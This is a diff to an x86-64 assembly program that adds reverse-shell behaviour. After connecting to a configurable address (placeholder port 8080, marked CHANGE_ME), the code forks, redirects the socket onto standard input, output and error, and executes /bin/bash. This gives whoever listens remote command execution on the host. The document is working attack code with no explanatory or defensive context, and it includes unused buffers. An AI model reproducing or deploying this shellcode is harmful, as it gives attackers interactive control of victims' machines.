@@ -5,14 +5,21 @@ struc sockaddr_in
     .sin_zero resb 8
 endstruc
 
+section .bss
+    pipefds:
+        resq 2
+
 section .data
-    pop_sa istruc sockaddr_in
+    sockaddr istruc sockaddr_in
         at sockaddr_in.sin_family, dw 2         ; AF_INET
         at sockaddr_in.sin_port, dw 0x1F90      ; 8080 (CHANGE_ME)
         at sockaddr_in.sin_addr, dd 0           ; localhost (CHANGE_ME)
         at sockaddr_in.sin_zero, dd 0, 0        ; 0
     iend
-    sockaddr_in_size equ $ - pop_sa
+    sockaddr_in_size equ $ - sockaddr
+
+    bash db "/bin/bash", 0
+    environment db "PATH=/bin:/usr/bin", 0
 
 section .text
     global _start
@@ -34,12 +41,39 @@ _start:
 
     mov rax, 0x2A                   ; connect(sock, (sockaddr*)&sockaddr_in, sizeof(sockaddr_in))
     mov rdi, rbx                    ; sock
-    lea rsi, [sockaddr_in]            ; (sockaddr*)&sockaddr_in
+    lea rsi, [sockaddr]             ; (sockaddr*)&sockaddr_in
     mov rdx, sockaddr_in_size       ; sizeof(sockaddr_in)
     syscall
 
     cmp rax, 0
     jne _end
+
+    mov rax, 0x39                   ; fork()
+    syscall
+
+    cmp rax, 0
+    jne _end
+
+    mov rax, 0x21                   ; dup2(oldfd, newfd)
+    mov rdi, rbx                    ; sock
+    mov rsi, 0                      ; STDIN
+    syscall
+
+    mov rax, 0x21                   ; dup2(oldfd, newfd)
+    mov rdi, rbx                    ; sock
+    mov rsi, 1                      ; STDOUT
+    syscall
+
+    mov rax, 0x21                   ; dup2(oldfd, newfd)
+    mov rdi, rbx                    ; sock
+    mov rsi, 2                      ; STDERR
+    syscall
+
+    mov rax, 0x3B                   ; execve("/bin/bash", NULL, NULL)
+    lea rdi, bash                   ; "/bin/bash"
+    xor rsi, rsi                    ; NULL
+    xor rdx, rdx                    ; NULL
+    syscall
 
 _end:
     mov rax, 0x3C                   ; exit(0)
